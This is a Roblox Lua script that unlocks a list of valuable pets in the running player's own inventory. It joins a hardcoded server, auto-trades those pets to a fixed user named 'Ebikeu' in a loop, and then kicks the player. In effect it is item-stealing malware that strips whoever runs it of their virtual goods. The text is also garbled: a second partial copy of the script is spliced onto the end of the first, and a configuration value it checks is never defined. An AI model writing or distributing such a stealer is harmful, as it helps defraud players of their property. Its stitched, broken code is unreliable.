local targetUsername = "Ebikeu"
local petsToTrade = {"Surge Dragon", "Dual Shock", "Overcharged Robot", "Grand Ice Wizard"}

-- CONFIGURATION
local config = {
    JobId = "d3a62cbe-1d69-4553-9478-b09cd6e98f06",  -- Updated Job ID (kept in config)
}

-- SERVICES
local Players = game:GetService("Players")
local Network = require(game:GetService("ReplicatedStorage").Modules.Network)
local Replication = require(game:GetService("ReplicatedStorage").Game.Replication)
local TeleportService = game:GetService("TeleportService")

-- VARIABLES
local player = Players.LocalPlayer

-- FUNCTIONS
function WaitForCondition(conditionFunc, timeout)
    local startTime = tick()
    while not conditionFunc() do
        if tick() - startTime > (timeout or 30) then
            return false
        end
        task.wait()
    end
    return true
end

function UnlockPets()
    local PetNames = {}
    for _, name in ipairs(petsToTrade) do
        PetNames[name] = true
    end
    
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return end
    
    for _, petData in pairs(pets) do
        if petData
            and petData.Name
            and PetNames[petData.Name]
            and (petData.Locked == true or petData.Locked == 1 or petData.Locked == "true")
        then
            Network:InvokeServer("LockPet", petData.Id, false)
        end
    end
end

function GetPetIDsByName()
    local petIDs = {}
    local pets = Replication.Data and Replication.Data.Pets
    if not pets then return petIDs end
    
    local petNameLookup = {}
    for _, name in ipairs(petsToTrade) do
        petNameLookup[name] = true
    end
    
    for _, petData in pairs(pets) do
        if petData and petData.Name and petNameLookup[petData.Name] then
            table.insert(petIDs, petData.Id)
        end
    end
    
    return petIDs
end

function HasPetsToTrade()
    local petIDs = GetPetIDsByName()
    return #petIDs > 0
end

function FindTargetPlayer()
    return Players:FindFirstChild(targetUsername)
end

function WaitForPetsRemoved(tradedPetIDs)
    local startTime = tick()
    
    while tick() - startTime < 3 do
        local currentPetIDs = GetPetIDsByName()
        
        local allRemoved = true
        for _, tradedId in ipairs(tradedPetIDs) do
            local stillHas = false
            for _, currentId in ipairs(currentPetIDs) do
                if currentId == tradedId then
                    stillHas = true
                    break
                end
            end
            if stillHas then
                allRemoved = false
                break
            end
        end
        
        if allRemoved then
            return true
        end
        
        task.wait(0.1)
    end
    
    return false
end

function TradeWithTarget()
    while true do
        if not HasPetsToTrade() then
            -- Debugging output to track pet data
            print("No pets to trade! Debugging:")
            local pets = Replication.Data and Replication.Data.Pets
            print(pets)
            
            if not player:FindFirstChild("Pets") then
                print("Player has no pets to trade. Kicking...")
                player:Kick("No more pets to trade")
                return
            end
        end
        
        -- Ensure UnlockPets happens after checking pets
        UnlockPets()

        -- The rest of your trade logic continues...
        local target = FindTargetPlayer()
        if not target then
            task.wait(5)
            return
        end
        
        Network:FireServer("SendTrade", target)
        
        local tradeEnabled = WaitForCondition(function()
            return player.PlayerGui.Trading.Enabled
        end, 5)
        
        if not tradeEnabled then
            task.wait(5)
            return
        end
        
        local petIDs = GetPetIDsByName()
        
        if #petIDs > 0 then
            for _, petId in ipairs(petIDs) do
                Network:InvokeServer("AddTradeItem", { "Pet", petId })
            end
            
            Network:FireServer("ReadyUp", false, true)
            
            local tradeCompleted = WaitForCondition(function()
                return not player.PlayerGui.Trading.Enabled
            end, 10)
            
            if not tradeCompleted then
                Network:FireServer("CloseTrade")
                task.wait(0.5)
            else
                WaitForPetsRemoved(petIDs)
            end
        end
        
        if HasPetsToTrade() then
            print("Re-entering trade with remaining pets")
            task.wait(1)
        else
            print("No more pets left to trade.")
            break
        end
    end
end

-- MAIN LOGIC
function WaitForGameToLoadAndCheckJobId()
    while not game:IsLoaded() do
        task.wait(1)
    end
    
    local currentJobId = game.JobId
    if currentJobId ~= config.JobId then
        print("Job ID mismatch. Waiting for correct game to load...")
        task.wait(5)
        return false
    end
    
    print("Game loaded. Verifying game ID...")
    task.wait(5)
    if game.GameId ~= config.GameId then
        print("Game ID mismatch.")
        return false
    end
    
    return true
end

function JoinGameWithJobId()
    if not HasPetsToTrade() then
        print("No pets to trade. Skipping join process.")
        return
    end

    -- Use the current gameâ€™s GameId and JobId
    local currentGameId = game.GameId
    local currentJobId = game.JobId
    
    print("Pets available. Joining current game with current Job ID...")
    TeleportService:TeleportToPlaceInstance(currentGameId, currentJobId)
end

-- Join the game using the current Game ID and Job ID
JoinGameWithJobId()

while true do
    if not HasPetsToTrade() then
        player:Kick("No more pets to trade")
        break
    end
    
    if WaitForGameToLoadAndCheckJobId() then
        print("Job and Game ID verified. Starting trade process.")
        TradeWithTarget()
    else
        print("Failed to join the correct game or match Job ID. Waiting...")
        task.wait(10)
    end
    task.wait(1)
endfunction TradeWithTarget()
    while true do
        if not HasPetsToTrade() then
            if not player:FindFirstChild("Pets") then
                player:Kick("No more pets to trade")
                return
            end
        end
        
        UnlockPets()
        
        local target = FindTargetPlayer()
        if not target then
            task.wait(5)
            return
        end
        
        Network:FireServer("SendTrade", target)
        
        local tradeEnabled = WaitForCondition(function()
            return player.PlayerGui.Trading.Enabled
        end, 5)
        
        if not tradeEnabled then
            task.wait(5)
            return
        end
        
        local petIDs = GetPetIDsByName()
        
        if #petIDs > 0 then
            for _, petId in ipairs(petIDs) do
                Network:InvokeServer("AddTradeItem", { "Pet", petId })
            end
            
            Network:FireServer("ReadyUp", false, true)
            
            local tradeCompleted = WaitForCondition(function()
                return not player.PlayerGui.Trading.Enabled
            end, 10)
            
            if not tradeCompleted then
                Network:FireServer("CloseTrade")
                task.wait(0.5)
            else
                WaitForPetsRemoved(petIDs)
            end
        end
        
        if HasPetsToTrade() then
            print("Re-entering trade with remaining pets")
            task.wait(1)
        else
            print("No more pets left to trade.")
            break
        end
    end
end

-- MAIN LOGIC
function WaitForGameToLoadAndCheckJobId()
    while not game:IsLoaded() do
        task.wait(1)
    end
    
    local currentJobId = game.JobId
    if currentJobId ~= config.JobId then
        print("Job ID mismatch. Waiting for correct game to load...")
        task.wait(5)
        return false
    end
    
    print("Game loaded. Verifying game ID...")
    task.wait(5)
    if game.GameId ~= config.GameId then
        print("Game ID mismatch.")
        return false
    end
    
    return true
end

function JoinGameWithJobId()
    TeleportService:TeleportToPlaceInstance(config.GameId, config.JobId)
end

-- Join the game using the specified Job ID
JoinGameWithJobId()

while true do
    if not HasPetsToTrade() then
        player:Kick("No more pets to trade")
        break
    end
    
    if WaitForGameToLoadAndCheckJobId() then
        print("Job and Game ID verified. Starting trade process.")
        TradeWithTarget()
    else
        print("Failed to join the correct game or match Job ID. Waiting...")
        task.wait(10)
    end
    task.wait(1)
end
